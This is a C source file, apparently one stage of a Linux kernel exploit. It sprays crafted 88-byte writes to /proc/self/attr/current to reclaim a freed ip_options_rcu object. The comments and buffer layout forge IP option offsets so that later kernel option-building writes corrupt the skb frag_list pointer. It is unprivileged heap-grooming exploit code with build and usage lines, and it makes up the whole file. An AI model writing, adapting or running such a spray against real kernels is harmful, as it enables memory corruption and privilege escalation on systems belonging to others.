/* attr_spray.c - reclaim the freed ip_options_rcu via proc_pid_attr_write.
 *
 * proc_pid_attr_write (fs/proc/base.c):
 *     page = memdup_user(buf, count);      // alloc = count, ARBITRARY bytes
 *     ... security_setprocattr(...);       // AppArmor parse -> error
 *     kfree(page);                         // freed immediately -> churn
 *
 * UNPRIVILEGED: a task writing its own /proc/self/attr/current (or any
 * /proc/self/attr/*) - only current==task and the-opener checks apply.
 * The memdup_user call site (proc_pid_attr_write+0xaf) shares the
 * RANDOM_KMALLOC_CACHES bucket with tcp_v4_save_options on boots where
 * hash_64(callsite ^ random_kmalloc_seed, 4) >> 60 collides; check per boot
 * with the seed kprobe / src/pick_spray.py before relying on it.
 *
 * No byte constraints (memdup_user copies count bytes verbatim).
 * This payload stages the frag_list call (see AGENTS.md 8b):
 *   optlen=40 srr=67 rr=68 ts=69 flags=0x28, faddr=32.32.32.32,
 *   __data = valid printable TS option, client ISN 0x6D507163 so the
 *   SYN-ACK ACK bytes are 109/113/100 -> the three ip_options_build writes
 *   land at iph+172/+176/+160 = shinfo+8 (frag_list low), shinfo+12
 *   (frag_list high), tailroom.
 *
 * Build: gcc -O2 -static -pthread -o attr_spray attr_spray.c
 * Usage: ./attr_spray <runtime_s> [cpu]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define ATTR "/proc/self/attr/current"
#define CNT 88   /* alloc = 88 bytes -> kmalloc-96 */

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    /* The allocation IS the object: buf index == object offset.
     * struct ip_options_rcu: rcu_head(16) + ip_options{
     *   faddr@+16 nexthop@+20 optlen@+24 srr@+25 rr@+26 ts@+27 flags@+28
     *   router_alert@+29 cipso@+30 pad@+31 __data@+32 } */
    unsigned char buf[CNT];
    int safe = getenv("ACCEPTOR_SAFE") != NULL;
    memset(buf, 0x41, sizeof(buf));
    buf[16] = 32; buf[17] = 32; buf[18] = 32; buf[19] = 32;  /* faddr 32.32.32.32 */
    buf[24] = 40;    /* optlen */
    buf[25] = safe ? 0 : 67;    /* srr  (write at iph+67+iph[68]-4 = shinfo+8)  */
    buf[26] = safe ? 0 : 68;    /* rr   (write at iph+68+iph[70]-5 = shinfo+12) */
    buf[27] = safe ? 0 : 69;    /* ts   (write at iph+69+iph[71]-9 = tailroom)  */
    buf[28] = safe ? 0x00 : 0x28;  /* flags: rr_needaddr | ts_needaddr */
    /* __data@+32 = valid printable TS option (passes RX ip_options_compile) */
    buf[32] = 0x44;   /* TS type 0x44 */
    buf[33] = 0x28;   /* TS len 40 */
    buf[34] = 0x25;   /* TS ptr 37 */
    buf[35] = 0x20;   /* TS flags: TSONLY */
    /* markers: s1 = object[39..42] = buf[39..42], s3 = object[47..50] = buf[47..50] */
    buf[39] = 0x41; buf[40] = 0x42; buf[41] = 0x43; buf[42] = 0x44;
    buf[47] = 0x45; buf[48] = 0x46; buf[49] = 0x47; buf[50] = 0x48;

    unsigned long n = 0, err = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            int fd = open(ATTR, O_WRONLY);
            if (fd < 0) { err++; continue; }
            ssize_t r = write(fd, buf, sizeof(buf));
            close(fd);
            if (r < 0) err++; else n++;
        }
    }
    fprintf(stderr, "[attr] writes=%lu err=%lu\n", n, err);
    return 0;
}
